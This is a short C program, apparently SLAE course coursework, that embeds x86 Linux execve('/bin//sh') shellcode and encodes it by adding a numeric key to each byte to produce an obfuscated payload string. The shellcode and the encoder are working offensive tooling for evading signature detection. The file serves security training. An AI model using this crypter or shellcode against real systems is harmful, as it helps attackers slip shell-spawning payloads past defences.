// Linux/x86 Custom crypter
// Author SLAE - 926 for SecurityTube Linux Assembly Expert course

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

unsigned char shellcode[] =\
"\x31\xc0\x50\x31\xdb\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe1\x53\x89\xe2\xb0\x0b\xcd\x80";


int main (int argc, char *argv[]){

unsigned char encrypted[strlen(shellcode)];

	if (argc > 2) {
		printf("Too many arguments\n");
		return 1;
	}
	
	if (argc < 2 ) {
		printf("Usage: ./encrypter <key>\n");
		return 1;
	}	

    char *ch = argv[1];
    char key = atoi(ch);

	int i;
	for(i = 0; i <=strlen(shellcode)-1; i++)
		encrypted[i] = shellcode[i] + key;
	
	printf("\nCustom crypter encrypted string:\n");
	for(i = 0; i <=strlen(shellcode)-1; i++)
		printf("\\x%02x", encrypted[i]);
	printf("\nLength: %d\n", strlen(encrypted));
}
